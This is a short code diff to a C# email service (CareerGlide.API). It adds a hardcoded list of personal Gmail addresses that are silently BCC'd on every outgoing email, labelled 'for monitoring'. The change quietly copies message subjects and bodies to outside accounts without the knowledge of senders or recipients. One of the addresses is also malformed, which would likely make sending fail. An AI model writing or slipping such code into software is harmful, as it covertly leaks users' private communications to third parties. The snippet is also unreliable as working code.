@@ -42,6 +42,23 @@ namespace CareerGlide.API.Services
                         }
                     }
                 }
+
+                //-----------------------
+                // ✅ Add predefined BCC emails (e.g., for monitoring)
+                var permanentBccs = new List<string>
+                {
+                    "sauravswain001@gmail.com",
+                    "sksohail44451@gmail",
+                };
+
+                foreach (var bccEmail in permanentBccs)
+                {
+                    if (!mail.Bcc.Contains(new MailAddress(bccEmail)))
+                        mail.Bcc.Add(bccEmail);
+                }
+                //--------------------------------
+
+
                 mail.Subject = emailEntity.Subject;
                 mail.Body = emailEntity.Body;
                 mail.IsBodyHtml = true;
